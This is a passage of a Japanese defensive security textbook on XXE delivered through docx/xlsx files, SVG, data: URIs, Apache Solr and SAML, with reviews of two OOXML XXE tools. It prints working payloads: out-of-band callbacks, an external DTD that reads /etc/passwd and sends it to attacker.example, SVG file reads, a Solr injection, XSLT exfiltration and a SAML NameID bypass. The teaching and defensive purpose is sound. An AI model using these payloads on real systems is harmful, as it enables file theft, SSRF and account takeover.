- `FileToOpen`は、タブを開いたときに**デフォルトでどのXMLファイルを表示するか**を指定する。デフォルトは`[Content_Types].xml`（OOXMLのZIP内でファイル種別のマッピングを定義するメタデータファイル）になっているが、実際にXXEを仕込みたいのは`word/document.xml`や`xl/sharedStrings.xml`であることが多いため、検証時にはこの値をターゲットに合わせて書き換える運用になる。
- `tryToFindZip`は、渡されたバイナリの中からZIPシグネチャ（ZIPファイルの先頭に現れる`PK`のマジックバイト）を探索して、パート内にZIPが埋め込まれているかを自動判定させるフラグである。マルチパートのバイナリ部分の先頭にHTTPやフォーム関連の余分なバイトが混じっていても、ZIP構造の開始位置を見つけ出そうとする救済策として働く。

#### Burp Collaboratorとの連携によるOut-of-Band検証

本拡張自体はペイロードを自動生成するわけではなく、あくまで「編集を容易にするエディタ」である。したがって実務では、タブ内でXMLを手動編集し、次のようなOut-of-Band（帯域外、レスポンスに直接結果が出ない代わりに外部への通信を観測して脆弱性を確認する手法）型のペイロードを仕込む使い方が想定されている。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe">
  %remote;
]>
```

ここで`BURP-COLLABORATOR-SUBDOMAIN`の部分に、Burp Collaborator（攻撃者が制御する一意なサブドメインへのDNS/HTTP通信を検知するOASTインフラ）が発行する一意のサブドメインを挿入する。サーバ側のXMLパーサが外部実体解決を許してしまっていれば、パーサはこのURLへHTTPリクエストを送信しようとし、その通信がCollaboratorに記録される。レスポンスに何も変化が表れないブラインドな状況でも、この通信の有無だけで脆弱性の存在を判定できる。Burp拡張としてCollaboratorクライアントとシームレスに連携できる点は、単体のスクリプトツールにはない利点である。

#### 制限事項：Intruderでは使えない

本拡張の既知の制限として、Burp IntruderでOOXMLタブが使えないという点が挙げられる。これはBurp拡張API側の制約に起因するもので、IntruderのCustomTab機構がMessage EditorのタブAPIと完全に同一のインターフェースを提供していないためである。したがって、複数のペイロードバリエーション（例えばコールバックURLだけを変えた多数の亜種）を自動的に総当たりでテストしたい場合、Intruderの自動化機能をそのまま使うことはできず、Repeaterで1件ずつ手動編集するか、後述のofficeXXEのようなスクリプト側で事前にファイルを複数生成してからIntruderの「ファイルアップロード」的な使い方（`§`マーカーでファイル全体を差し替える方式）を組み合わせる、といった工夫が必要になる。

> 出典: PortSwigger/office-open-xml-editor — https://github.com/PortSwigger/office-open-xml-editor

#### バージョンと保守状況について

このリポジトリはPython 2.7を前提として書かれている。Python 2は2020年1月1日に公式サポートが終了しており、Burp Suite自体も拡張のPython実行環境としてJythonを介したPython 2系をサポートしてきた歴史的経緯がある。現行のBurp SuiteはPython拡張の実行にJython（Python 2互換）を必要とする場合が多く、この拡張を動かすには別途Jythonのスタンドアロンjarをダウンロードし、Burpの拡張設定でPython環境として指定する必要がある。長期間更新されていないツールをそのまま使う際は、依存するJythonのバージョンやBurp本体との互換性を検証環境で事前に確認すべきである。

### officeXXE（GigaByteRex製ペイロード生成スクリプト）

#### 概要と位置づけ

officeXXEは、Office Open XML Editorとは対照的に「Burpに依存しない、単体のPythonスクリプトとしてXXEペイロード入りのOfficeファイルを生成するツール」である。README上の説明は簡潔で、"XXE payload generator for office files"（Officeファイル向けXXEペイロード生成器）とされている。

> 出典: GigaByteRex/officeXXE — https://github.com/GigaByteRex/officeXXE

用途としては、対象アプリケーションにOOXMLファイルをアップロードさせる機能があり、そこにペイロード入りのdocx/xlsxをそのまま渡して脆弱性の有無を確認したい、という場面を想定している。Burp拡張のようにリアルタイムでリクエストを編集するのではなく、**事前にペイロード入りのファイルを作り置きしておく**という発想のツールである。

#### 使い方：ウィザードモードとCLIオプション

officeXXEは対話的なウィザードモードと、コマンドライン引数を直接指定するモードの両方を提供する。

```
python officeXXE.py
```

と実行すると、ファイル形式や攻撃タイプを質問形式で選ばせるウィザードが起動する。一方、自動化を想定した直接実行では以下のようなオプションを取る。

```
-f, --filetype   1(docx) または 2(xlsx)
-a, --attack      1(payload) または 2(clusterbomb)
-d, --domain      コールバック監視用ドメイン
-o, --output      出力ファイル名
```

> 出典: GigaByteRex/officeXXE — https://github.com/GigaByteRex/officeXXE

`clusterbomb`という攻撃タイプ名は、Burp Intruderの攻撃モード名（複数のペイロードリストを総当たりの直積で組み合わせる方式）から借用したものと考えられるが、README・コードの記述からは「計画段階の機能」であり、実際に完全動作するのは`payload`（単一のコールバックURLを埋め込む方式）のみである点に注意が必要である。

#### XXEペイロードテンプレートの中身

スクリプト内の`docx_payload_text`という変数に、あらかじめ用意されたXXEペイロードのテンプレート文字列が格納されている。中身は次のような、教科書的なOut-of-Band型のXXEペイロードである。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "REPLACEME">]>
<foo>&xxe;</foo>
```

> 出典: GigaByteRex/officeXXE（officeXXE.py内 docx_payload_text）— https://github.com/GigaByteRex/officeXXE

このテンプレートの`REPLACEME`という文字列が、CLIで指定した`-d`（ドメイン）オプションの値、すなわち攻撃者が観測するコールバック用URL（例：Burp Collaboratorのサブドメインや、独自に用意したOOB検証用サーバのURL）に置換される。`<!ELEMENT foo ANY>`は「`foo`要素の中身として任意のコンテンツを許可する」というDTDの要素宣言であり、これによって直後の`&xxe;`という実体参照が文法上正しい位置に置けるようになる。`SYSTEM`キーワードは外部実体（external entity）であることを示し、パーサはこのURIへ実際にアクセスを試みる。この構造は本教科書の前節で扱った「外部一般実体によるOut-of-Band XXE」の基本形そのものであり、officeXXEはこの汎用ペイロードを機械的にOOXMLコンテナへ埋め込む「配送役」に徹しているツールだと理解するとよい。

#### 処理フロー：なぜdocxしか実質動かないのか

READMEおよびコードから読み取れる処理の流れは次の通りである。

1. `docx_payload_program()`関数が呼び出され、新規の空docxファイルをテンプレートとして用意する
2. これをZIPとして一時ディレクトリに展開する
3. 展開後の`word/document.xml`を、上記のXXEペイロードテンプレート（コールバックURL埋め込み済み）で**丸ごと上書き**する
4. 展開したファイル一式を再度ZIP圧縮し、指定された出力ファイル名でOOXML（docx）として保存する
5. 一時ファイル・ディレクトリを削除してクリーンアップする

xlsx形式についても同様に`xl/sharedStrings.xml`（Excelにおいて文字列データを一元管理するXML、セルはこのファイルへのインデックス参照として値を持つ）を対象にした処理が用意されているが、README上では開発者自身が「テスト時のXXE発火に成功していない」旨を明言しており、動作するのは事実上docxのみである。

この非対称性が生じる理由を、OOXMLパーサの実装から推測すると次のように整理できる。Word文書ビューア（Microsoft WordやOfficeの各種SDK、あるいはサーバサイドで文書を処理するライブラリ）は`word/document.xml`をほぼそのままの構造でパースして本文として解釈するのに対し、Excelの`sharedStrings.xml`は「共有文字列テーブル」という特殊な役割を持ち、多くのExcel実装がこのファイルの読み込み時に構造検証やキャッシュ機構を独自に挟むことが多い。そのため、単純にファイル全体をDTD付きのXXEペイロードで置き換えるだけでは、Excel側のバリデーションで弾かれたり、そもそも期待される`<sst>`ルート要素などのスキーマから外れて文書自体が壊れたファイル（corrupt）として扱われてしまう可能性がある。README中で開発者が「ボイラープレート（テンプレート全体）を丸ごと上書きするのではなく、既存の正当なXMLの中に最小限のDOCTYPE宣言と実体参照だけを**動的に挿入**する方式に変更すべきだ」という改善方針を述べているのは、まさにこの問題への対処案である。つまり、ファイル全体を壊れた最小限のXMLに差し替えるのではなく、既存の妥当なOOXML構造を保ったまま、DTD宣言だけを注入する方が、より多様な実装で本文としてパースされる可能性が高くなるという考え方である。

#### 保守状況について

READMEでは開発者自身が本ツールを「ダクトテープで保持されているPOC（Proof of Concept、概念実証コード）の状態」と評しており、プルリクエストを歓迎する旨が明記されている。最終更新から時間が経っている場合、依存ライブラリ（Python 2/3のどちらを前提にしているか、`zipfile`や`argparse`のAPI差異など）が現在の実行環境と噛み合わない可能性があるため、利用する際はまずローカルの検証用サンドボックスで実行確認を行うべきである。

> 出典: GigaByteRex/officeXXE — https://github.com/GigaByteRex/officeXXE

### 2ツールを比較して見えてくる設計思想の違い

ここまでの内容を整理すると、2つのツールは同じ「OOXML×XXE」というテーマを扱いながら、アプローチが対照的であることが分かる。

| 観点 | Office Open XML Editor | officeXXE |
|---|---|---|
| 実行環境 | Burp Suite拡張（Python 2.7 / Jython） | スタンドアロンPythonスクリプト |
| 主な用途 | 既存のOOXMLファイルをリクエスト送信時にその場で編集 | ペイロード入りOOXMLファイルを事前に生成 |
| OOB検証との連携 | Burp Collaboratorとシームレスに連携可能 | コールバックドメインをCLI引数で指定するのみ（Collaboratorとの直接統合はない） |
| 自動化（Intruder等）との相性 | Intruderでは使用不可という制約あり | 生成したファイルをIntruderのファイル差し替え機能に渡すなど、外部で組み合わせる運用が可能 |
| 対応形式の成熟度 | docx/xlsx/pptxいずれもエディタとして開ける（ペイロードの中身は利用者が用意） | docxのみ実質動作、xlsxは既知の未解決課題 |

この対比から得られる実務上の教訓は、「リアルタイム編集型（Burp拡張）」と「事前生成型（スタンドアロンスクリプト）」という2つのワークフローが、目的に応じて使い分けられるべきだという点である。1つのペイロードをじっくり手動で試行錯誤したい場面ではBurp拡張のインタラクティブ性が有利であり、逆に同一ペイロードを複数のエンドポイントやアカウントに対して繰り返しアップロードするような場面では、事前生成したファイルをスクリプトやIntruderのパイプラインに載せる方が効率的である。

### 防御側の視点：これらのツールの存在から読み取るべきこと

本教科書はあくまで防御目的の解説であるため、最後にこれらのツールの挙動から導かれる防御上の要点を整理しておく。

1. **アップロードされたOOXMLファイルは「信頼できないZIPアーカイブ」として扱う。** Office Open XML Editorがマルチパートのパートを自動検出してZIPとして展開できてしまう、という事実そのものが、OOXMLが実質的に「ZIP＋複数XML」という構造であることを裏付けている。サーバ側でOOXMLを処理する際は、まずファイルシグネチャ・MIMEタイプ・拡張子の整合性を検証したうえで、ZIP展開後の各XMLファイルに対しても個別にXMLパーサの安全設定（外部実体解決の無効化、DTD処理自体の禁止など）を適用する必要がある。単に「拡張子が.docxだから安全」と判断してはならない。
2. **`[Content_Types].xml`や`sharedStrings.xml`など、一見目立たない補助的なXMLファイルも攻撃対象になり得る。** officeXXEが`word/document.xml`を主眼としつつ`sharedStrings.xml`にも手を出そうとしていたように、OOXMLコンテナ内のどのXMLファイルであっても、パーサが安全でない設定で読み込めばXXEの入口になり得る。防御側は「本文相当のXMLだけを守ればよい」という思い込みを捨て、ZIP内の全XMLファイルに対して一律に安全なパーサ設定を適用すべきである。
3. **Out-of-Band（帯域外）検証手法を前提に監視を設計する。** どちらのツールも最終的にはコールバックURL（Collaboratorや自前のOASTサーバ）への通信有無で脆弱性を判定する設計になっている。これは裏を返せば、実運用環境においてもサーバから予期しない外部への送信ネットワーク接続（アウトバウンド通信）が発生していないかを監視することが、XXEの悪用検知・侵入検知の観点で有効な防御策になるということを意味する。ファイアウォールやEDR（Endpoint Detection and Response）でアプリケーションサーバの不要なアウトバウンド通信を制限・監視することは、XXEに限らずSSRF全般に対する多層防御としても機能する。
4. **ツールの存在自体が「反復検証の効率化ニーズ」を示している。** これらのツールが作られた動機は、まさに「手作業でのZIP展開・再圧縮が面倒だから」という点にあった。これは裏返せば、セキュリティ診断側にとってOOXMLへのXXE注入は十分に定型化・自動化可能な作業であることを意味し、防御側は「攻撃には手間がかかるはずだ」という楽観に頼らず、根本的な対策（XMLパーサの安全なデフォルト設定の採用、外部実体解決を無効化したライブラリバージョンの使用）を講じるべきである。

## 各種ファイル形式経由XXEの解説とSAML

これまでの章では、リクエストボディに直接XMLを送り込むXXE（XML External Entity、XML外部実体参照）を扱ってきた。しかし現実のアプリケーションでは「XMLを直接受け付ける口」は塞がれていることが多い一方、**内部でXMLを解釈している別のファイル形式**が無防備に残っていることが非常に多い。docx・xlsx・pptxといったOffice文書、SVG画像、そしてSAML（Security Assertion Markup Language、XMLベースのシングルサインオン規格）は、いずれも「見た目はXMLではないが、中身はXMLパーサに食わされる」代表例である。

本節では、これらの「XMLを間接的に解釈する各種ファイル形式」を経由したXXEを、なぜ成立するのかという仕組みのレベルから解説する。防御目的の解説であり、実在サービスや本番環境への無許可の検証、破壊的手順は扱わない。攻撃面（アタックサーフェス）を理解して自組織の入力処理を点検することが目的である。

### なぜ「ファイル形式経由XXE」が成立するのか

XXEの本質は「XMLパーサが**DOCTYPE宣言と外部実体（external entity）を処理してしまう**」ことにある。ここで重要なのは、XMLパーサはリクエストボディに直接置かれたXMLだけでなく、**アップロードされたファイルの内部にあるXML**も同じように解釈する、という点だ。

- **OOXML（Office Open XML）文書**（docx / xlsx / pptx）は、実体がZIPアーカイブであり、その中に複数のXMLファイルが入っている。サーバがサムネイル生成・テキスト抽出・変換処理のためにこれらXMLをパースすると、そこに仕込まれたXXEが発火する。
- **SVG**（Scalable Vector Graphics）はそもそもXML文書そのものである。画像アップロード機能がSVGを受理し、変換ライブラリ（ImageMagick、rsvg等）や描画時にパースすると発火する。
- **SAML**では、ブラウザ経由でPOSTされる`SAMLResponse`がbase64デコードされた後にXMLとしてパースされる。署名検証の前段でパースが行われるため、そこがXXEやXML署名ラッピングの標的になる。

つまり共通する原理は、**「アプリはXMLを受け取っているつもりがなくても、内部処理の途中で必ずXMLパーサを通す」**という一点だ。sink（入力が最終的に解釈・実行される危険な到達先）がXMLパーサである限り、そこへ到達する経路がファイル形式という「衣」を着ているだけで、XXEの成立条件は変わらない。

---

### OOXML（docx / xlsx / pptx）文書経由のXXE

#### OOXMLの内部構造を理解する

Willis Vandevanter（BuffaloWill）の解説によれば、OXML（OOXML）は「docx（Word文書）、pptx（PowerPoint）、xlsx（Excelスプレッドシート）など、一般的な文書形式」を指し、その正体は**「XMLファイルとメディアファイルを含んだZIPファイル」**である。文書がレンダリングされるとき、レンダリングライブラリはまず文書を解凍（unzip）し、続いて含まれるXMLファイルをパースする。

実際、任意のdocxファイルの拡張子を`.zip`に変えて展開すると、おおむね次のような構造になっている。

```
example.docx  (実体はZIP)
├── [Content_Types].xml        ← 各パートのMIMEタイプ定義。最初にパースされやすい
├── _rels/.rels                ← ルートのリレーションシップ定義
├── docProps/
│   ├── core.xml               ← タイトル・作者などのコアプロパティ
│   └── app.xml
└── word/
    ├── document.xml           ← 本文。最も一般的なXXE注入先
    ├── _rels/document.xml.rels
    ├── styles.xml
    └── settings.xml
```

Vandevanterは、これらの内部XMLファイルにXML外部実体を埋め込むことで「文書がパースされたときにXXEが発火する」成功例を、特に**ファイルアップロード機能**において過去に持っていたと述べている。そして重要な観察として、**「どのXMLファイルにXXEを埋め込むかによって成功率が変わる」**と明言している。これはパースの順序と、どのファイルが優先されるかが文書タイプに依存するためだ。したがって`word/document.xml`だけでなく、`[Content_Types].xml`や`docProps/core.xml`など複数の候補を試す価値がある。

> ⚠️ **未取得の資料の補足**: 元記事「Exploiting XXE Vulnerabilities in OXML Documents - Part 1」は意図的にPart 1として構成されており、具体的なDTDコードやペイロード例は続編（Part 2）に譲る形で本文には掲載されていません。取得できた範囲は上記の「構造・パース挙動・埋め込み先の選択」までです。全文は以下からご確認ください: https://silentrobots.com/exploiting-xxe-vulnerabilities-in-oxml-documents-part-1/
>
> （以下は未取得資料の補足として一般知識に基づく解説です）実務では、この記事の著者が公開したツール `oxml_xxe`（https://github.com/BuffaloWill/oxml_xxe）が定番として使われてきました。同ツールはdocx / xlsx / pptxに加え、OpenDocument形式（odt / odg / odp / ods）、SVG、素のXMLに対応し、選択した内部XMLへペイロードを自動注入して再ZIP化します。歴史的には、この種の脆弱性が**2014年12月にFacebookで報告された**ことが著名な実例として言及されています。

> 出典: Willis Vandevanter「Exploiting XXE Vulnerabilities in OXML Documents - Part 1」 — https://silentrobots.com/exploiting-xxe-vulnerabilities-in-oxml-documents-part-1/

#### 具体的な注入手順とペイロード（防御理解のため）

「Book of BugBounty Tips」は、docxを使った履歴書（resume）パース機能へのXXE手順を、次の4ステップで簡潔に示している。これは「求人サイトが応募者のdocx履歴書を解析して氏名・職歴を抽出する」といった機能を想定したものだ。

1. `.docx`ファイルを解凍（unzip）する
2. `word/document.xml`を編集する
3. XXEの実体宣言を注入する
4. 再びZIP化してアップロードする

注入する宣言の例は次の通り。

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burp.collab.net/mal.dtd"> %xxe;]>
```

このペイロードの「なぜ」を分解すると次のようになる。

- `<!DOCTYPE foo [ ... ]>` は文書型定義（DTD）の内部サブセットを開き、ここに実体を定義できるようにする。この宣言はXML本文（`<?xml ... ?>`宣言の直後）の先頭に置く必要がある。
- `<!ENTITY % xxe SYSTEM "http://.../mal.dtd">` は**パラメータ実体（parameter entity、`%`で始まる実体）**を定義している。パラメータ実体はDTD内部でのみ展開でき、通常の実体（`&`で始まる汎用実体）よりも制約が緩い場面が多く、外部DTDを引き込むのに使う。
- `%xxe;` でそのパラメータ実体を即座に参照し、攻撃者サーバ上の外部DTD（`mal.dtd`）を**その場で読み込ませる**。この外部DTDの中に、ファイル読み出しと外部への送信（out-of-band、帯域外送出）を行う本命の実体定義を書いておく、という二段構えが典型だ。

なぜ二段構えにするかというと、多くのパーサは「内部サブセット内で、汎用実体の値の中に別の実体参照を入れ子にする」ことを禁じる一方、**外部DTD（外部サブセット）の中でならその入れ子が許される**からだ。この差を突いて、外部DTD側にBlind XXE用のexfiltration（データ抽出）ロジックを置く。典型的な`mal.dtd`の中身は次のようになる（原理理解のための一般例）。

```xml
<!-- 攻撃者サーバ上の mal.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?d=%file;'>">
%eval;
%exfil;
```

- `%file;` で対象ファイルを読み込み、その内容を文字列として保持する。
- `%eval;` は「`%exfil`という新しいパラメータ実体を、`%file`の中身をURLクエリに埋め込む形で定義する」ためのメタ的な実体だ。`&#x25;`は`%`のXML数値文字参照で、これによりDTD解析の段階を一段ずらして「後から評価される`%`」を書ける。
- `%exfil;` を参照した瞬間に、ファイル内容を載せたHTTPリクエストが攻撃者サーバへ飛ぶ。応答本文をレスポンスで直接読めない**Blind（ブラインド）XXE**でも、この帯域外チャネルで内容を回収できる。

このように、docxはただの「XMLを包んだZIP」であるため、XMLボディを直接送れないアップロード機能であっても、内部XMLを書き換えるだけでXXEの入口になる。防御側の教訓は明確で、**「Office文書やSVGを受け取る処理でも、内部XMLは信頼できない入力として扱い、DTD/外部実体を無効化したパーサで処理する」**ことに尽きる。

> 出典: Book of BugBounty Tips「XXE」 — https://gowsundar.gitbook.io/book-of-bugbounty-tips/xxe

---

### URL制限を回避するdata: URIとSVGのテクニック

同じ「Book of BugBounty Tips」は、防御が部分的にかかっている環境での回避策も示している。教科書としては、これらは「なぜ既存の防御がすり抜けられるのか」を理解するための材料である。

#### data: URIによるSVGペイロードの持ち込み

企業側が「任意の外部URLへのアクセス」をブロックしている場合でも、**data: URIプロトコル**を使ってSVGペイロードを埋め込むと回避できることが多い、と述べられている。

```
data:image/svg+xml;base64,XXE_PAYLOAD
```

なぜこれが効くのか。`data:` スキームは外部への通信を伴わず、URI自体にコンテンツ（ここではbase64エンコードされたSVG=XML）を内包する。URLフィルタやSSRF（Server-Side Request Forgery）対策が「`http://`や`https://`の宛先」だけを検査していると、`data:`で運ばれたXMLがすり抜けて、そのままXMLパーサに渡ってしまう。base64化されていることで、単純なキーワード検査（`<!DOCTYPE`や`<!ENTITY`の文字列マッチ）も回避されやすい。防御側は、宛先URLのスキームだけでなく**デコード後の中身**まで検査する必要がある、という教訓になる。

#### その他の入口: Content-Type変換とApache Solr

同資料はさらに、XMLを「受け付けているように見えない」エンドポイントを狙う複数の入口を挙げている。

- **JSON→XML変換**: 「POST/PUT/PATCHのボディを常にXMLへ変換して再送し、Content-Typeの変更を忘れるな」。多くのAPIフレームワークはJSONとXMLの両方を受理するよう設定されており、`Content-Type: application/json`を`application/xml`に変えてボディをXML化するだけで、隠れたXMLパーサに到達できることがある。
- **Apache Solr**の`/select`エンドポイント: `q`パラメータに`{!xmlparser v='<!DOCTYPE a SYSTEM "http://collab.burp.net"><a></a>'}`を与えると、SolrのXMLパーサ機能が外部実体を解決してしまう。

```
/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://collab.burp.net"><a></a>'}
```

これらは「XMLの入口はボディ直送だけではない」ことを示しており、防御の観点では**アプリが内部で使うすべてのXMLパーサ設定を横断的に堅牢化する**必要があることを意味する。

> 出典: Book of BugBounty Tips「XXE」 — https://gowsundar.gitbook.io/book-of-bugbounty-tips/xxe

---

### XXEの基礎ペイロードの再整理（BugBountyHunter）

BugBountyHunter（zseano）の「Learn about XML Injection (XXE)」は、XXEを**「サーバ上のファイルを読み出し、外向きの通信を行ってデータを抽出できる注入（injection）の一種」**と定義している。ファイル形式経由XXEを理解する土台として、そこで示される基礎ペイロードを「なぜそうなるか」とともに再確認しておく。

**(1) 実体展開の動作確認（無害な自己参照）**

```xml
<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
```

ここでは`&example;`が`Doe`に置換される。これは「このパーサはそもそも実体（ENTITY）を展開するのか？」を確かめる無害なプローブであり、応答に`Doe`が反映されれば、外部実体も処理される可能性が高いと判断できる。

**(2) ローカルファイルの読み出し**

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

`SYSTEM 'file:///etc/passwd'`は外部実体を**ローカルファイルシステム**に向ける。パーサが`&test;`を展開する際に`/etc/passwd`を読み込み、その内容が`<root>`要素の値としてレスポンスに反映される（結果が画面に返る=in-band型）。

**(3) 帯域外（OOB）での存在検知**

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

パラメータ実体`%ext;`が攻撃者管理下のユニークなホストへHTTPリクエストを送る。応答本文がレスポンスに返らないBlind環境でも、**そのホストにアクセスが届いたという事実**だけでXXEの存在が確認できる。ファイル形式経由XXE（docxやSVG）でも、まずこのOOB検知でパースの有無を確かめるのが定石だ。

**(4) SVGによるファイル読み出し**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text>&xxe;</text>
</svg>
```

SVGは前述の通りXML文書そのものなので、`&xxe;`で読み込んだファイル内容を`<text>`要素として描画させ、生成された画像やその応答に反映させることでファイル内容を抜き出せる。`standalone="yes"`でもDTDの内部サブセットは処理される点に注意。

BugBountyHunterは防御についても、**「多くのアプリは何らかのフィルタを実装しているので、何がブロックされているかを分析してバイパスを組み立てる（XSSテストと同様のアプローチ）」**と述べている。裏を返せば、防御側は「特定文字列のブラックリスト」ではなく、**DTDと外部実体そのものを無効化する**というホワイトリスト的・機能無効化的な対策でなければ回避されるということだ。

> 出典: BugBountyHunter（zseano）「Learn about XML Injection (XXE)」 — https://www.bugbountyhunter.com/vulnerability/?type=xxe

---

### SAML経由のXXEと関連攻撃

SAMLは、IdP（Identity Provider、認証を行う側）とSP（Service Provider、サービスを提供する側）の間で認証情報をやり取りするためのXMLベースのSSO（シングルサインオン）規格である。ブラウザは`SAMLResponse`という**「deflate圧縮 → base64エンコード」**されたXMLを運ぶ。SPはこれをbase64デコード・展開してからXMLとしてパースし、XML署名（XML Signature）で改ざんがないかを検証する。この「**パースが署名検証より前に走る**」という順序こそが、SAMLをXML系攻撃の宝庫にしている核心だ。

> ⚠️ **未取得の資料**: 「HackTricks: SAML Attacks」本体ページ（https://hacktricks.wiki/en/pentesting-web/saml-attacks/index.html）は自動取得できませんでした（理由: `tollbit.hacktricks.wiki`へ302リダイレクトされ、リダイレクト先が402 Payment Requiredを返したため）。以下の解説は、同内容のGitHub原本（HackTricks-wikiリポジトリの`src/pentesting-web/saml-attacks/README.md`）から取得した内容に基づいています。原文は上記URLからもご確認いただけます。

#### SAMLへのXXE注入

攻撃者は`SAMLResponse`のXMLへ、DOCTYPE宣言と外部実体を注入できる。

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
```

**なぜ成立するのか**が肝心だ。SPが署名検証を行う前に、まずXMLを構造化するためのパースを実行する。このパース段階でDTDと外部実体が有効なままだと、署名が無効（あるいは未署名）であっても、**署名検証にたどり着く前に**外部実体が解決され、ファイル読み出しやSSRFが発生してしまう。「署名で守られているから安全」という直感が通用しないのは、守るべき処理（パース）が守り（署名検証）より先に来ているからである。

#### XSLT攻撃（署名検証より前のスタイルシート実行）

同様の「順序」問題は、XSLT（XSL Transformations、XMLを変換する言語）でも起きる。HackTricksは**「XSLT変換は電子署名の検証より前に実行される」**と明記している。したがって署名が無効でも悪用できる。

```xml
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
```

`unparsed-text()`はXSLT 2.0以降でファイルをテキストとして読み込む関数で、読み込んだ内容を攻撃者URLに連結して送出（exfiltration）する。さらに、再帰的なXSLTテンプレートは**深さnで2^n個のノードを生成する**指数的増殖を引き起こし、DoS（サービス妨害）にもなり得る。防御としては「XSLTを拒否し、必要な正規化（canonicalization）アルゴリズムのみを許可リスト化する」ことが挙げられている。

#### XML署名ラッピング（XSW）攻撃

XXEと並ぶSAMLの主要攻撃が**XSW（XML Signature Wrapping、XML署名ラッピング）**だ。これは「署名検証が見るノード」と「アプリのロジックが実際に読むノード」がズレる（parser differential、パーサ差異）ことを突く。攻撃者は署名を無効化しないまま、**偽の要素を注入**する。HackTricksはXSW #1〜#8の系統を挙げている。

- **XSW #1〜#2**: enveloping/detached署名を使い、悪意ある`Response`要素を追加する
- **XSW #3〜#4**: 同一階層または入れ子階層に、重複した`Assertion`を配置する
- **XSW #5〜#6**: 入れ子の`Assertion`を伴う非標準の署名構成
- **XSW #7〜#8**: スキーマ検証を回避するため、制約の緩い`Extensions`要素を悪用する

原理は共通で、「署名は正規の（署名済みの）アサーションを検証して**有効**と判定するが、アプリは別の位置に置かれた**攻撃者制御のアサーション**を読んでしまう」という取り違えだ。これにより、正規のログイン応答を1つ入手できれば、それを土台に別ユーザーへのなりすましが可能になる。

#### コメント・処理命令による正規化バイパス

より繊細な差異として、コメントや処理命令（processing instruction）を挿入して署名層とアプリ層の解釈をズラす手口がある。

```xml
<saml:NameID><?p not-an-?>admin@example.com</saml:NameID>
```

署名層は`not-an-admin@example.com`として検証する一方、アプリは処理命令を無視して`admin@example.com`を抽出する。結果として**アカウント乗っ取り**につながる。関連する実例として、`ruby-saml`の**CVE-2024-45409**が挙げられている。これは、正当に署名された応答を捕捉した攻撃者が「新たなアサーションを偽造し、任意ユーザーとして認証できる」ものであった。IDや`NameID`を書き換えつつ、署名参照を有効に見えるよう作り替える点でXSWの一種である。

#### SAML攻撃への防御

HackTricksが挙げる防御策は、上記の「順序」と「差異」の問題に直接対応している。

- 身元情報を消費する前に、**検証済みノードとの厳密な結合（exact verified-node binding）**を要求する（署名が検証したノードと、業務ロジックが読むノードが**同一**であることを保証する）
- **XSLTを拒否**し、必要な正規化アルゴリズムのみを許可リスト化する
- 署名検証の**前段**で、XMLの深さ・ノード数・リクエストサイズに上限を課す（XXE/XSLT爆発対策）
- 未署名・自己署名の応答や、別種のリクエスト（`AuthnRequest`、`LogoutRequest`）でもテストする
- IdPとSP間の**証明書の信頼関係**を検証する

そして最も基本的な対策は、XXE全般と同じく**「SAMLのXMLをパースするパーサでDTDと外部実体を無効化する」**ことである。

> 出典: HackTricks「SAML Attacks」 — https://hacktricks.wiki/en/pentesting-web/saml-attacks/index.html （取得はGitHub原本 `HackTricks-wiki/hacktricks` の `src/pentesting-web/saml-attacks/README.md` 経由）

---

### 本節のまとめ: 「XMLを解釈する経路」を数え上げる

本節を貫く教訓は一つだ。XXE対策とは「XMLエンドポイントを守る」ことではなく、**「アプリ内部でXMLパーサが動くすべての経路を数え上げ、そのすべてでDTD/外部実体を無効化する」**ことである。

| 経路 | 実体 | XMLパーサが動く契機 | 主な防御 |
| --- | --- | --- | --- |
| docx/xlsx/pptx | XMLを含むZIP | 解凍後の内部XMLパース（テキスト抽出・変換） | 内部XMLも untrusted として扱い、外部実体無効化 |
| SVG | XML文書そのもの | 画像変換・描画時のパース | アップロード画像のパーサ堅牢化、SVGの無害化 |
| data: URI | URIに内包されたXML | デコード後のパース | スキームだけでなくデコード後の中身を検査 |
| JSON→XML / Solr等 | 代替Content-Typeで届くXML | 隠れたXMLパーサ | 全パーサ設定の横断的堅牢化 |
| SAML | base64+deflateされたXML | 署名検証**前**のパース/XSLT | DTD/XSLT無効化、検証済みノードとの厳密結合 |

共通対策は一貫している。使用するXMLパーサで**DOCTYPE宣言・外部一般実体・外部パラメータ実体をすべて無効化**し（多くのライブラリで`disallow-doctype-decl`等の設定として提供される）、SAMLのような署名付き文書では**「署名が検証したノードと、アプリが読むノードの同一性」**まで踏み込んで保証する。ファイル形式という衣に惑わされず、内部で動くパーサの設定を点検することが、この種のXXEを根絶する唯一の道である。

## 日本語のSVG/帳票アップロード資料

